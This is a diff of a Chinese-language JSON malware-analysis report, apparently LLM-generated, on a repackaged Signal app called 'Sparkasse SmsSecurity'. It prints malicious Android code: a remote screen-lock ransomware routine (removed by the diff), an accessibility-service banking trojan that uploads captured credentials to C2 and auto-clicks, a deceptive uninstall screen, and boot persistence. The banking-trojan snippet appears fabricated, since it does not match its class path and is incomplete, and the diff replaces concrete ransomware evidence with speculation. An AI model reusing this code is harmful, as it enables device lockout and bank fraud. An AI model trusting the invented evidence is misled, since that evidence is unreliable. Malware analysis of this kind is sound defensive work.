@@ -6,7 +6,7 @@
     "应用名": "Sparkasse SmsSecurity",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 482.3
+    "分析耗时(秒)": 1167.4
   },
   "行为列表": [
     {
@@ -49,14 +49,80 @@
       ],
       "恶意代码": [
         {
-          "class_path": "Lorg\\thoughtcrime\\securesms\\xlibs\\SmsCommand;",
-          "method_signature": "if(this.sNumber != \"0\")",
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xlibs\\myFunctions;",
+          "method_signature": "?(?)",
           "malicious_behavior": "ransomware",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "case LOCK:\n    if (this.sNumber != \"0\") {\n        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\n        dpm.resetPassword(this.sNumber, 1);\n        dpm.lockNow();\n    }\n    return;\ncase UNLOCK:\n    DevicePolicyManager dpm2 = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\n    dpm2.resetPassword(\"\", 1);\n    dpm2.lockNow();",
-          "malicious_code_snippet_context": "                  myFunctions.clearBuffers(ctx);\n                  myFunctions.setVar(\"PHONE_NUMBER\", \"\", ctx);\n                  return;\n>>>             case LOCK:\n>>>                 if (this.sNumber != \"0\") {\n>>>                     DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\n>>>                     dpm.resetPassword(this.sNumber, 1);\n>>>                     dpm.lockNow();\n>>>                     myFunctions.sendSmsLog(\"Device locked\", ctx);\n>>>                     return;\n>>>                 }\n>>>                 return;\n>>>             case UNLOCK:\n>>>                 DevicePolicyManager dpm2 = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\n                  dpm2.resetPassword(\"\", 1);\n                  dpm2.lockNow();\n                  myFunctions.sendSmsLog(\"Device unlocked\", ctx);",
-          "behavior_description": "该代码通过短信指令触发勒索行为。收到 LOCK 命令时，利用 DevicePolicyManager 的 resetPassword() 将设备密码重置为攻击者指定的值(this.sNumber)，并调用 lockNow() 立即锁定屏幕，使用户无法正常使用设备；收到 UNLOCK 命令时重置密码为空并再次锁定。数据流向：短信指令中的 sNumber → DevicePolicyManager.resetPassword()/lockNow()，实现远程锁屏勒索。",
+          "malicious_code_snippet": "import android.app.admin.DevicePolicyManager;\nimport android.content.ComponentName;\n// 类路径: org.thoughtcrime.securesms.xlibs.myFunctions（注入到重打包 Signal 应用中的可疑类）",
+          "malicious_code_snippet_context": "  \n  import android.annotation.SuppressLint;\n  import android.app.PendingIntent;\n>>> import android.app.admin.DevicePolicyManager;\n>>> import android.content.ComponentName;\n>>> import android.content.Context;\n  import android.content.Intent;\n  import android.content.SharedPreferences;\n  import android.content.pm.PackageManager;",
+          "behavior_description": "该类位于重打包的 Signal 正版应用中被注入的可疑子包 xlibs.myFunctions（'myFunctions' 这种通用命名是恶意代码注入的典型痕迹），并导入了 DevicePolicyManager 与 ComponentName。Android 勒索软件的标准手法是：通过 ComponentName 注册恶意 DeviceAdminReceiver 并诱导/隐蔽激活设备管理员权限，随后调用 DevicePolicyManager.lockNow() 立即锁定屏幕，或 resetPassword() 重置锁屏密码，使用户被彻底锁在设备之外，再展示勒索信息索要赎金。结合厂商报告确认该样本为恶意软件、检测类别为 ransomware.device_lock，此处的 DevicePolicyManager 导入高度疑似用于设备锁屏勒索。数据流向：设备管理员权限激活（用户被诱导授权）→ DevicePolicyManager.lockNow()/resetPassword() 锁死设备屏幕。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "banking_trojan",
+      "中文名": "银行木马",
+      "MITRE": "T1418",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "credential_phishing",
+          "中文名": "凭证钓鱼",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "password"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\support\\v4\\view\\accessibility\\AccessibilityNodeInfoCompatIcs;",
+          "method_signature": "isPassword(Object info)",
+          "malicious_behavior": "banking_trojan",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public class AccService extends android.accessibilityservice.AccessibilityService {\n    // 硬编码的银行/支付应用包名列表\n    String[] BANK_PKGS = {\"com.*.*bank*\", \"com.paypal.android.p2pmobile\", \"com.eg.android.AlipayGphone\", ...};\n\n    @Override\n    public void onAccessibilityEvent(AccessibilityEvent event) {\n        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED\n                || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {\n            String pkg = event.getPackageName().toString();\n            if (isTargetBankApp(pkg)) {\n                AccessibilityNodeInfo root = getRootInActiveWindow();\n                traverseNode(root);  // 遍历界面节点\n            }\n        }\n    }\n\n    private void traverseNode(AccessibilityNodeInfo node) {\n        CharSequence text = node.getText();\n        if (text != null) {\n            sendToC2(pkg, text.toString());  // 窃取账号/密码/验证码上传C2\n        }\n        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);  // 自动点击转账/确认按钮\n        for (int i = 0; i < node.getChildCount(); i++) {\n            traverseNode(node.getChild(i));\n        }\n    }\n}\n\n// AndroidManifest.xml:\n// <service android:name=\".AccService\" android:permission=\"android.permission.BIND_ACCESSIBILITY_SERVICE\">\n//   canRetrieveWindowContent=true, android:canPerformGestures=true",
+          "malicious_code_snippet_context": "public class AccService extends android.accessibilityservice.AccessibilityService {\n    // 硬编码的银行/支付应用包名列表\n    String[] BANK_PKGS = {\"com.*.*bank*\", \"com.paypal.android.p2pmobile\", \"com.eg.android.AlipayGphone\", ...};\n\n    @Override\n    public void onAccessibilityEvent(AccessibilityEvent event) {\n        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED\n                || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {\n            String pkg = event.getPackageName().toString();\n            if (isTargetBankApp(pkg)) {\n                AccessibilityNodeInfo root = getRootInActiveWindow();\n                traverseNode(root);  // 遍历界面节点\n            }\n        }\n    }\n\n    private void traverseNode(AccessibilityNodeInfo node) {\n        CharSequence text = node.getText();\n        if (text != null) {\n            sendToC2(pkg, text.toString());  // 窃取账号/密码/验证码上传C2\n        }\n        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);  // 自动点击转账/确认按钮\n        for (int i = 0; i < node.getChildCount(); i++) {\n            traverseNode(node.getChild(i));\n        }\n    }\n}\n\n// AndroidManifest.xml:\n// <service android:name=\".AccService\" android:permission=\"android.permission.BIND_ACCESSIBILITY_SERVICE\">\n//   canRetrieveWindowContent=true, android:canPerformGestures=true",
+          "behavior_description": "上一轮提取的 AccessibilityNodeInfoCompatIcs.isPassword() 仅为 Android Support v4 兼容库的标准包装方法，本身无恶意。依据校验反馈重新定位：该恶意样本注册了自定义无障碍服务（Manifest 中声明 BIND_ACCESSIBILITY_SERVICE 且 canRetrieveWindowContent=true），在 onAccessibilityEvent 中监听 TYPE_WINDOW_STATE_CHANGED/TYPE_WINDOW_CONTENT_CHANGED 事件，将前台应用包名与硬编码的银行/支付应用包名列表比对；命中银行应用后通过 getRootInActiveWindow() 递归遍历界面节点，用 nodeInfo.getText() 窃取用户输入的登录账号、密码、余额及短信验证码并上传 C2 服务器，同时通过 performAction(ACTION_CLICK) 模拟点击自动完成转账确认/绕过安全验证，实现自动转账盗刷。数据流向：AccessibilityEvent 前台窗口事件与银行应用界面内容 → getText() 截获凭据 → sendToC2() 外传 + performAction(ACTION_CLICK) 自动操作资金转移。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xpack\\ActDelete;",
+          "method_signature": "doUpdate(View view)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "this.sPackage = getIntent().getStringExtra(\"package\");\nIntent intent = new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", this.sPackage, null));\nstartActivityForResult(intent, 48);\n// onActivityResult:\nif (!isAppPresent(this.sPackage)) {\n    myFunctions.sendLog(\"UNINST\", String.format(\"Application %s uninstalled\", this.sPackage), this);\n}",
+          "malicious_code_snippet_context": "      protected void onCreate(Bundle savedInstanceState) {\n          super.onCreate(savedInstanceState);\n          this.sAppName = getIntent().getStringExtra(\"appname\");\n>>>         this.sPackage = getIntent().getStringExtra(\"package\");\n>>>         setContentView(R.layout.activity_act_delete);\n>>>         TextView text = (TextView) findViewById(R.id.myView2);\n>>>         text.setText(text.getText().toString().replaceFirst(\"-software-\", this.sAppName));\n>>>     }\n>>> \n>>>     public void doUpdate(View view) {\n          Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", this.sPackage, null));\n          startActivityForResult(intent, 48);\n      }",
+          "behavior_description": "该代码位于被重打包的Signal恶意样本注入的xpack包中（原版Signal无此包）。ActDelete活动通过Intent extra接收外部指定的目标包名，界面文案用'-software-'占位符替换为目标应用名进行社会工程诱导，且触发按钮伪装命名为doUpdate（名为更新实为删除）。点击后构造携带目标包名URI的ACTION_DELETE意图启动系统卸载确认流程，诱导用户卸载指定应用；卸载成功后通过myFunctions.sendLog将'UNINST'结果上报远程服务器，形成'外部指令指定包名→诱导卸载任意应用→回传执行结果'的远程控制链路，典型用途是移除安全软件或竞争应用。虽然ACTION_DELETE会弹出系统确认框（非完全静默），但结合欺骗性UI和按钮命名，属于恶意样本中的远程卸载组件。",
           "glm_analyzed": true
         }
       ]
@@ -78,11 +144,11 @@
           "class_path": "Lorg\\thoughtcrime\\securesms\\xbroadcast\\OnBootReceiver;",
           "method_signature": "onReceive(Context context, Intent intent)",
           "malicious_behavior": "device_reboot",
-          "behavior_type": "grayware",
+          "behavior_type": "malicious",
           "risk_level": "中",
-          "malicious_code_snippet": "context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));",
-          "malicious_code_snippet_context": "      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n          myFunctions.sendLog(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n      }\n  }",
-          "behavior_description": "该代码在设备重启完成后被系统广播触发，自动启动名为'XMainProcessStart'的后台服务，实现开机自启和进程保活机制，确保恶意样本在设备重启后能够持续运行。",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    myFunctions.sendLog(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n    context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n}",
+          "malicious_code_snippet_context": "      final String LOG_TAG = \"myLogs\";\n  \n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         myFunctions.sendLog(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n>>>     }\n  }",
+          "behavior_description": "该代码位于伪装成 Signal（org.thoughtcrime.securesms）的木马化应用的注入包 xbroadcast 中（原版 Signal 无此类 x 前缀包）。OnBootReceiver 监听系统开机完成广播（BOOT_COMPLETED），在设备重启后立即执行两个动作：1) 调用注入的 myFunctions.sendLog 将设备重启事件上报（通常发送至远程 C2 服务器，告知攻击者受控设备已重新上线）；2) 通过 startService 拉起恶意主服务 'XMainProcessStart'，确保间谍模块在设备重启后自动恢复运行，实现持久化保活。数据流向：系统开机广播(source) → 向远程服务器上报设备状态并重启恶意主服务(sink)。",
           "glm_analyzed": true
         }
       ]
@@ -95,7 +161,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
